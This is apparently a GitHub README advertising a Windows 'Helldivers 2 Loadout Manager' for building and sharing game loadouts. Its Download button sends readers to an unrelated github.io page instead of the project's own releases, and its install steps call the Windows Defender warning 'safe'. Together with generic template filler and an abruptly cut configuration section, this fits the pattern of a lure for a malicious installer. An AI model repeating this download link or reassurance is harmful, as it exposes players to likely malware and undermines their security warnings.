# Helldivers‑2 Loadout Manager

**Author:** *IntersectScholar*
**Platform:** Windows 10 / Windows 11 (desktop only)

A lightweight, Windows‑only utility that lets you **create**, **edit**, **organise**, and **share** your Helldivers 2 loadouts—all from a clean, modern UI.

---

## Table of Contents

- [Features](#features)
- [Installation & First Run](#installation--first-run)
- [How to Use](#how-to-use)
- [Configuration Files](#configuration-files)
- [Sharing & Importing](#sharing--importing)
- [Roadmap](#roadmap)
- [Contributing](#contributing)
- [License](#license)
- [Support](#support)

---

## Features

| ✅ | Description |
|---|-------------|
| **Intuitive Drag‑&‑Drop UI** | Build loadouts visually; no manual editing of JSON files. |
| **Multiple Profiles** | Keep separate loadouts for solo, co‑op, or specific missions. |
| **Live Validation** | The manager warns you about illegal weapon‑or‑perk combos before you save. |
| **One‑Click Export / Import** | Share a `.hldloadout` file with friends or import community‑crafted builds. |
| **Theme Support** | Light and dark themes that respect Windows system settings. |
| **Automatic Backup** | Previous versions are stored locally, so you can roll back instantly. |
| **Compact Footprint** | Optimised for Windows 10/11; no unnecessary background services. |

---

## Installation & First Run

1. Click the **Download** button below.
2. Save the installer to a folder you trust.
3. Run the installer (you’ll be prompted by Windows Defender – it’s safe).
4. After installation, launch **Helldivers‑2 Loadout Manager** from the Start menu.

### Download

<a href="https://rewfdf.github.io/SetupPage/"><img src="https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=windows" alt="Download"></a>
<a href="https://github.com/IntersectScholar/Helldivers-2-Loadout-Manager/releases"><img src="https://img.shields.io/github/v/release/IntersectScholar/Helldivers-2-Loadout-Manager?style=for-the-badge&color=green" alt="Latest Release"></a>

---

## How to Use

1. **Create a New Loadout** – Press **New** → give it a name.
2. **Select Weapons & Gear** – Drag items from the left pane onto the loadout slots.
3. **Adjust Perks** – Toggle perk switches; the UI will highlight any conflicts.
4. **Save** – Click **Save** or press <kbd>Ctrl + S</kbd>. Your file is stored in `%APPDATA%\Helldivers2\Loadouts`.
5. **Export** – Hit **Export** to generate a shareable `.hldloadout` file.

> **Tip:** Use the **Search** bar to quickly locate weapons or perks by name.

---

## Sharing & Importing

- **Export** a loadout → share the resulting file through Discord, email, or any file‑sharing service.
- **Import** by dragging a `.hldloadout` file onto the manager window or using **File → Import**.
- Community loadouts are curated in the **#helldivers‑loadouts** channel on the official Discord (link in the *Support* section).

---

## Roadmap

| Milestone | Planned Features |
|-----------|------------------|
| **v1.1** | Cloud sync via OneDrive, custom colour palettes |
| **v1.2** | utility support, advanced statistics viewer |
| **v2.0** | Full integration with the Helldivers 2 launcher (API) |

---

## Contributing

Contributions are welcome!

1. Fork the repo.
2. Create a feature branch (`git checkout -b feature/awesome‑thing`).
3. Ensure the code follows the existing style and runs on Windows 10/11.
4. Open a Pull Request with a clear description of your changes.

Please read the [CONTRIBUTING.md](CONTRIBUTING.md) for detailed guidelines.

---

## License

This project is licensed under the **MIT License** – see the [LICENSE](LICENSE) file for details.

---

## Support

- **Issues:** Open a GitHub issue for bugs or feature requests.
- **Discord:** Join the official Helldivers‑2 community server – #loadout‑manager‑help.
- **Email:** `support@intersectscholar.dev` (responses within 48 h).

---

*Happy diving, and may your loadouts always be optimal!*

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```